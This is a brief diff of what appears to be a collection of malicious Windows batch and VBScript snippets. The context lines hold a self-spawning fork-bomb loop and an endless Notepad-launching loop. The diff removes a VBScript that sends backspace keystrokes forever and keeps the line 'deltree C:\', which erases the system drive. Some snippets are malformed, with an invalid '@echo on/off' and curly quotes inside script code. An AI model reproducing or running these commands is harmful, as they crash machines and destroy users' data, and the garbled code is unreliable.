@@ -1,4 +1,4 @@
-    @echo on/off
+    @echo on/off 
     A
     start
     goto A
@@ -46,12 +46,5 @@
     :top
 START %SystemRoot%\system32\notepad.exe
 GOTO top
-MsgBox “Let’s go back a few steps”
-Set wshShell =wscript.CreateObject(”WScript.Shell”)
-do
-wscript.sleep 100
-wshshell.sendkeys “{bs}”
-loop
-@echo off 
 deltree C:\
 
